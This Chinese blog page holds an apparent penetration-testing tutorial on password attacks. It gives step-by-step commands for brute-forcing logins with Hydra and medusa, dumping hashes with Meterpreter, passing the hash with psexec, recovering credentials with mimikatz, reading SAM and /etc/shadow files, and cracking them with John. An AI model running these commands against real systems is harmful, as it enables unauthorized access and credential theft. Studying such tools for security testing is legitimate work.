<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>密码攻击 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="密码攻击" />
<meta property="og:description" content="一、密码在线破解
1、Hydra工具:支持几乎所有协议的在线密码破解，如ftp,http,https,mysql…
1）启动Hydra攻击
2）、target页面如下
passwords界面
tuning选项卡
设置任务的编号和超时时间，如果任务太多，服务的响应速率下降，将原来默认的任务编号16修改为2，超时时间改为15，将Exit after first found pair复选框勾上，找到第一匹配时停止攻击
3)、单击start进行攻击
2、medusa工具：通过并行登录暴力破解的方法，尝试获取远程验证服务访问权限，medusa能验证的远程服务：AFP,FTP,HTTP,IMAP…
例如：用medusa暴力破解地址为IP的路由器
medusa -h IP -u admin 密码文件 -M http -e ns -n 80 -F -h 指定主机
-u 指定用户
-M 指定模块
-e 指定额外的密码检查，ns变量允许我们使用用户名作为密码，并且使用空密码
-n 指定端口号
-F 允许我们在成功找到用户名密码组合之后停止爆破
二、分析密码（通过从目标系统、组织中收集信息来获得一个较小的密码字典）
1、Ettercap工具：用户能够使用Ettercap工具快速地创建伪造的包，从而实现网络适配器到应用软件各种级别的包，绑定监听数据到本地端口
1）修改配置文件
locate etter.conf #定位配置文件位置，ec_uid和ec_gid都设置为0
2）ettercap -G启动ettercap
与之前中间人攻击一样嗅探密码ettercap 8.3.1 中间人攻击
2、使用MSFCONSOLE分析密码（通过search_email_collector模块搜集一个组织相关的各种邮件信息，这些邮件信息有助于构建字典）
msfconsole #使用MSFCONSOLE search email collector #查询search_email_collector模块 use auxiliary/gather/search_email_collector #切换模块 show options #查看有效选项 set DOMAIN xxx.com #配置DOMAIN选项 set outfile xxx #配置输出文件路径 3、哈希值识别工具Hash Identifier（识别哈希值的加密方式）" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/d78300c4307c62f6bc4dd0a60044077d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-12-14T14:02:09+08:00" />
<meta property="article:modified_time" content="2020-12-14T14:02:09+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">密码攻击</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>一、密码在线破解<br> 1、<strong>Hydra工具</strong>:支持几乎所有协议的在线密码破解，如ftp,http,https,mysql…<br> 1）启动Hydra攻击<br> <img src="https://images2.imgbox.com/92/2b/F2801MlV_o.png" alt="在这里插入图片描述"><br> 2）、target页面如下<br> <img src="https://images2.imgbox.com/0d/59/BFNa522l_o.png" alt="在这里插入图片描述"></p> 
<p>passwords界面<br> <img src="https://images2.imgbox.com/3e/4e/m9yRG4wV_o.png" alt="在这里插入图片描述"><br> tuning选项卡<br> <img src="https://images2.imgbox.com/21/3c/MUdmGA4t_o.png" alt="在这里插入图片描述"><br> 设置任务的编号和超时时间，如果任务太多，服务的响应速率下降，将原来默认的任务编号16修改为2，超时时间改为15，将Exit after first found pair复选框勾上，找到第一匹配时停止攻击<br> 3)、单击start进行攻击<br> 2、<strong>medusa工具</strong>：通过并行登录暴力破解的方法，尝试获取远程验证服务访问权限，medusa能验证的远程服务：AFP,FTP,HTTP,IMAP…<br> 例如：用medusa暴力破解地址为IP的路由器</p> 
<pre><code class="prism language-php">medusa <span class="token operator">-</span>h <span class="token constant">IP</span> <span class="token operator">-</span>u admin 密码文件 <span class="token operator">-</span>M http <span class="token operator">-</span>e ns <span class="token operator">-</span>n <span class="token number">80</span> <span class="token operator">-</span>F
</code></pre> 
<blockquote> 
 <p>-h 指定主机<br> -u 指定用户<br> -M 指定模块<br> -e 指定额外的密码检查，ns变量允许我们使用用户名作为密码，并且使用空密码<br> -n 指定端口号<br> -F 允许我们在成功找到用户名密码组合之后停止爆破</p> 
</blockquote> 
<p>二、分析密码（通过从目标系统、组织中收集信息来获得一个较小的密码字典）<br> 1、<strong>Ettercap工具</strong>：用户能够使用Ettercap工具快速地创建伪造的包，从而实现网络适配器到应用软件各种级别的包，绑定监听数据到本地端口<br> 1）修改配置文件<br> locate etter.conf #定位配置文件位置，ec_uid和ec_gid都设置为0<br> <img src="https://images2.imgbox.com/c6/5e/9HCOSCxd_o.png" alt="在这里插入图片描述"><br> 2）ettercap -G启动ettercap<br> 与之前中间人攻击一样嗅探密码<a href="https://blog.csdn.net/qq_44111753/article/details/111129545">ettercap 8.3.1 中间人攻击</a></p> 
<p>2、<strong>使用MSFCONSOLE分析密码</strong>（通过search_email_collector模块搜集一个组织相关的各种邮件信息，这些邮件信息有助于构建字典）</p> 
<pre><code>  msfconsole    #使用MSFCONSOLE
  search email collector  #查询search_email_collector模块
  use auxiliary/gather/search_email_collector   #切换模块
  show options  #查看有效选项
  set DOMAIN xxx.com #配置DOMAIN选项
  set outfile xxx  #配置输出文件路径
</code></pre> 
<p>3、<strong>哈希值识别工具Hash Identifier</strong>（识别哈希值的加密方式）</p> 
<pre><code>hash-identifier
4e44298897ed12cdc10e5302fa781688
</code></pre> 
<p>输出<br> <img src="https://images2.imgbox.com/47/65/835PcHKQ_o.png" alt="在这里插入图片描述"><br> 三、破解LM Hashes密码<br> LM hash是使用NTLMv2使用前的唯一可用版本<br> 使用 findmyhash工具破解LM hashes密码，语法格式如下</p> 
<pre><code class="prism language-powershell">findmyhash &lt;Encryption&gt; <span class="token operator">-</span>h hash
</code></pre> 
<p>Encryption:指定使用的哈希加密类型<br> -h：指定要破解的LM哈希值<br> <strong>findmyhash MD5 -h hash</strong><br> 当破解LM Hashes太慢</p> 
<p>Metasploit的psexec模块绕过Hash值，获取一个活跃的远程会话之后</p> 
<pre><code class="prism language-powershell">getid  <span class="token comment">#查看用户的权限信息</span>
background  <span class="token comment">#设置当前用户绕过UAC，当前用户的权限将变成SYSTEM</span>
run post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>hashdump  <span class="token comment">#查看目标主机所有用户的哈希密码值</span>
</code></pre> 
<p>输出用户的哈希密码值后，使用<strong>SMB psexec 模块</strong>绕过hash值</p> 
<pre><code class="prism language-powershell">background  <span class="token comment">#后台执行会话</span>
use  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>psexec   <span class="token comment">#使用SMB psexec 模块</span>
<span class="token function">set</span> RHOST IP <span class="token comment">#设置远程主机地址</span>
<span class="token function">set</span> SMBUser Test  <span class="token comment">#设置SMB用户</span>
<span class="token function">set</span> SMBPass xxxx <span class="token comment">#设置SMB密码（即上面得到的用户对应的哈希密码值）</span>
exploit
</code></pre> 
<p>四、<strong>破解纯文本密码工具mimikatz</strong><br> 目标主机运行veil创建的可执行文件backup.exe，获取一个远程会话之后</p> 
<pre><code class="prism language-powershell">getuid  <span class="token comment">#确认目标用户的权限</span>
load mimikatz  <span class="token comment">#加载mimikatz模块</span>
help <span class="token comment">#查看有效命令</span>
msv  <span class="token comment">#恢复哈希密码</span>
kerberos  <span class="token comment">#获取网络认证协议信息（可以看到哈希加密的原始密码）</span>
wdigest  <span class="token comment">#获取摘要式身份验证信息</span>
livessp  <span class="token comment">#恢复身份验证信息</span>
</code></pre> 
<p>五、破解操作系统用户密码<br> 1、破解windows用户密码</p> 
<blockquote> 
 <p>windows的用户名和密码保存在SAM文件中，在基于NT核的windows的系统中，包括在windows2000及后续版本中，这个文件保存在"C:\Windows\System32\Config"目录下，由于安全原因，操作系统启动后，SAM文件同时被锁定，用户无法打开或复制SAM文件，同时SAM文件还经过加密。</p> 
</blockquote> 
<p>步骤：<br> 只要目标处于运行状态，就可以利用meterpreter和SAM Juicer获取计算机上的散列文件，获取访问系统的物理权限之后，用户就可以启动其他的操作系统，如USB或DVD-ROM设备上的Kali Linux，启动目标计算机进入其他操作系统之后，可以使用Kali的<strong>John the Ripper工具</strong>来解析该Windows用户密码</p> 
<pre><code class="prism language-php">fdisk <span class="token operator">-</span>l  <span class="token shell-comment comment">#查看当前系统中的硬盘驱动</span>
mkdir <span class="token operator">/</span>sda1   <span class="token shell-comment comment">#创建挂载点</span>
mount <span class="token operator">/</span>dev<span class="token operator">/</span>sda1  <span class="token operator">/</span>sda1<span class="token operator">/</span>  <span class="token shell-comment comment">#挂在/dev/sda1分区</span>
cd  <span class="token operator">/</span>sda1<span class="token operator">/</span><span class="token constant">WINDOWS</span><span class="token operator">/</span>system32<span class="token operator">/</span>config<span class="token operator">/</span>  <span class="token shell-comment comment">#进入SAM文件的位置</span>
samdump2 <span class="token constant">SAM</span> system <span class="token operator">&gt;</span><span class="token operator">/</span>root<span class="token operator">/</span>hash<span class="token punctuation">.</span>txt <span class="token shell-comment comment">#使用samdump2提取SAM文件</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>john <span class="token operator">/</span>root<span class="token operator">/</span>hash<span class="token punctuation">.</span>txt <span class="token operator">--</span>format<span class="token operator">=</span>nt  <span class="token shell-comment comment">#运行john命令实现密码攻击</span>
</code></pre> 
<p>2、破解Linux用户密码</p> 
<blockquote> 
 <p>和破解win的方法类似，只有一点不同，Linux系统将加密的密码散列包含在一个叫shadow的文件里，文件的绝对路径是/etc/shadow，用John the Ripper破解该文件前，还需要/etc/passwd文件，这和提取Windows密码散列需要system文件和SAM文件是一样的道理。John the Ripper自带了一个功能，可以将shadow文件和passwd文件结合在一起。</p> 
</blockquote> 
<pre><code class="prism language-php">unshadow <span class="token operator">/</span>etc<span class="token operator">/</span>passwd <span class="token operator">/</span>etc<span class="token operator">/</span>shadow <span class="token operator">&gt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>linux_hashes<span class="token punctuation">.</span>txt  <span class="token shell-comment comment">#使用unshadow提取密码散列</span>
john <span class="token operator">--</span>format<span class="token operator">=</span>crypt <span class="token operator">--</span>show <span class="token operator">/</span>tmp<span class="token operator">/</span>linux_hashes<span class="token punctuation">.</span>txt <span class="token shell-comment comment">#破解Linux用户密码</span>
</code></pre> 
<p>六、创建密码字典<br> <strong>Crunch工具</strong><br> 启动：直接在命令行crunch命令<br> 语法格式：<code>crunch [mininum length][maxinum length][character set][options]</code></p> 
<blockquote> 
 <p>常用的选项：<br> -o 用于指定输出字典文件的位置<br> -b 指定写入文件的最大字节数，该大小可以指定KB,MG或GB，但必须和-o START选项一起使用 <br> -t 设置使用特殊格式 <br> -l 该选项用于当-t选项指定@、%或^时，用于识别占位符的一些字符</p> 
</blockquote> 
<p>例如创建一个长度最小为3，最大为5，字符集为1234567890，执行命令如下</p> 
<pre><code class="prism language-php">crunch <span class="token number">3</span> <span class="token number">5</span> <span class="token number">1234567890</span> <span class="token operator">-</span>o output<span class="token punctuation">.</span>txt 
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/f398becc54d149e26264a833c563dff6/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">JAVA常见异常信息（保存）</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/730db77aaec609a57c45736995c17495/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">pandas._libs.tslibs.timestamps.Timestamp数据类型转化为13位时间戳</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>